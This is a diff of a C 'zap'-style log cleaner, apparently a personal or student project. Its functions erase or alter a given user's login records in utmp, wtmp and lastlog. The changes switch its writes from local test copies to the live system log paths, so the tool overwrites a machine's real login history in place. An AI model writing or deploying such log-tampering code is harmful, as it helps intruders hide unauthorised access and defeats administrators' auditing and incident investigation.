@@ -183,7 +183,7 @@ int uwtmp_change(char* src_path, char* dst_path,char* username1, char* username2
 }
 
 int GetLastlogData_from_wtmp(char* src_path, char* username1, struct lastlog* dst_data){
-    FILE* f_wtmp = fopen("./wtmp", "r");
+    FILE* f_wtmp = fopen(src_path, "r");
     struct utmp utmp_data = {0,};
 
     struct lastlog latest_lastlog_data = {0,};
@@ -204,7 +204,7 @@ int GetLastlogData_from_wtmp(char* src_path, char* username1, struct lastlog* ds
     return 0;
 }
 
-int lastlog_modify(char* src_path, char* dst_path, int uid){
+int lastlog_modify(char* src_path, char* dst_path, int uid, char* username){
     // remake the lastlog file based on wtmp file
     // remove the original file and make it as a new file
     
@@ -230,7 +230,7 @@ int lastlog_modify(char* src_path, char* dst_path, int uid){
     fread(&lastlog_data, sizeof(struct lastlog), 1, f_lastlog);
 
     //get the last login data from wtmp file
-    GetLastlogData_from_wtmp("./wtmp", username1, &lastlog_data);
+    GetLastlogData_from_wtmp(_PATH_WTMP, username, &lastlog_data);
     
     memcpy(modified_lastlog_data + idx, &lastlog_data, sizeof(struct lastlog));
     idx += sizeof(struct lastlog);
@@ -253,47 +253,47 @@ int lastlog_modify(char* src_path, char* dst_path, int uid){
 }
 
 int A_OptZap(char* username1){
-    uwtmp_modify(1, _PATH_UTMP, "./utmp", username1,0,0);
-    uwtmp_modify(1, _PATH_WTMP, "./wtmp", username1,0,0);
+    uwtmp_modify(1, _PATH_UTMP, _PATH_UTMP, username1,0,0);
+    uwtmp_modify(1, _PATH_WTMP, _PATH_WTMP, username1,0,0);
 
     struct passwd* passwd_data = getpwnam(username1);
     if (passwd_data == NULL) return 0; // no username for modify
     //since there are "reboot" in utmp/wtmp file, I didn't do this before the uwtmp_modify fts.
 
-    lastlog_modify(_PATH_LASTLOG, "./lastlog", passwd_data->pw_uid);
+    lastlog_modify(_PATH_LASTLOG, _PATH_LASTLOG, passwd_data->pw_uid, username1);
 
     return 0;   
 }
 
 int a_OptZap(char* username1, char* tty1, char* mmddyy1){
-    uwtmp_modify(0, _PATH_UTMP, "./utmp", username1, tty1, mmddyy1);
-    uwtmp_modify(0, _PATH_WTMP, "./wtmp", username1, tty1, mmddyy1);
+    uwtmp_modify(0, _PATH_UTMP, _PATH_UTMP, username1, tty1, mmddyy1);
+    uwtmp_modify(0, _PATH_WTMP, _PATH_WTMP, username1, tty1, mmddyy1);
 
     struct passwd* passwd_data = getpwnam(username1);
     if (passwd_data == NULL) return 0; // no username for modify
     //since there are "reboot" in utmp/wtmp file, I didn't do this before the uwtmp_modify fts.
     
-    lastlog_modify(_PATH_LASTLOG, "./lastlog", passwd_data->pw_uid);
+    lastlog_modify(_PATH_LASTLOG, _PATH_LASTLOG, passwd_data->pw_uid, username1);
 
     return 0;
 
 }
 
 int R_OptZap(char* username1,char* username2,char* tty1,char* tty2,char* mmddyy1,char* mmddyy2){
-    uwtmp_change(_PATH_UTMP, "./utmp", username1, username2, tty1, tty2, mmddyy1, mmddyy2);
-    uwtmp_change(_PATH_WTMP, "./wtmp", username1, username2, tty1, tty2, mmddyy1, mmddyy2);
+    uwtmp_change(_PATH_UTMP, _PATH_UTMP, username1, username2, tty1, tty2, mmddyy1, mmddyy2);
+    uwtmp_change(_PATH_WTMP, _PATH_WTMP, username1, username2, tty1, tty2, mmddyy1, mmddyy2);
 
     struct passwd* passwd_data = getpwnam(username1);
     if (passwd_data == NULL) return 0; // no username for modify
     //since there are "reboot" in utmp/wtmp file, I didn't do this before the uwtmp_modify fts.
     
-    lastlog_modify(_PATH_LASTLOG, "./lastlog", passwd_data->pw_uid);
+    lastlog_modify(_PATH_LASTLOG, _PATH_LASTLOG, passwd_data->pw_uid, username1);
 
-    struct passwd* passwd_data = getpwnam(username2);
+    passwd_data = getpwnam(username2);
     if (passwd_data == NULL) return 0; // no username for modify
     //since there are "reboot" in utmp/wtmp file, I didn't do this before the uwtmp_modify fts.
     
-    lastlog_modify(_PATH_LASTLOG, "./lastlog", passwd_data->pw_uid);
+    lastlog_modify(_PATH_LASTLOG, _PATH_LASTLOG, passwd_data->pw_uid, username2);
 
     return 0;
 }
